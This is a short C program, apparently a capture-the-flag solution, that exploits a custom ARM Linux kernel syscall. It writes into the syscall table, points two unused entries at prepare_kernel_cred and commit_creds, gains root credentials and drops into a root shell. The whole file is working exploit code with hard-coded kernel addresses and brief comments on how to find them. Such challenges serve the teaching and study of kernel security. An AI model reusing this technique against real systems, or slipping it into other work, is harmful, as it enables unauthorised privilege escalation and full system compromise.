//gcc -o exp _syscall.c
#include <unistd.h>
#include <stdio.h>

#define SYS_CALL_TABLE 0x8000e348

// cat /proc/kallsys | grep 'commit_creds \| prepare_kernel_cred'
#define PREPARE_KERNEL_CRED 0x8003f924
// 0x8003f56c  '6c' is low_case, so adding padding to '60'
#define COMMIT_CREDS 0x8003f560
#define SYS_EMPTY_A 188
#define SYS_EMPTY_B 189

int main() {
    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;
    char nop[] = "\x01\x10\xa0\xe1";  //rasm2 -a arm 'mov r1,r1'
    char buf[13];
    int i = 0;
    for (i = 0; i < 12; i++) {
        buf[i] = nop[i % 4];
    }
    buf[12] = '\x00';
    syscall(223, buf, COMMIT_CREDS);
    puts("Stage 1 - add padding");
    syscall(223, "\x24\xf9\x03\x80", sct + SYS_EMPTY_A);
    syscall(223, "\x60\xf5\x03\x80", sct + SYS_EMPTY_B);
    puts("Stage 2 - overwrite syscall table");
    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));
    puts("Stage 3 - set new cred");
    system("/bin/sh");
    return 0;
}

//Congratz!! addr_limit looks quite IMPORTANT now... huh?
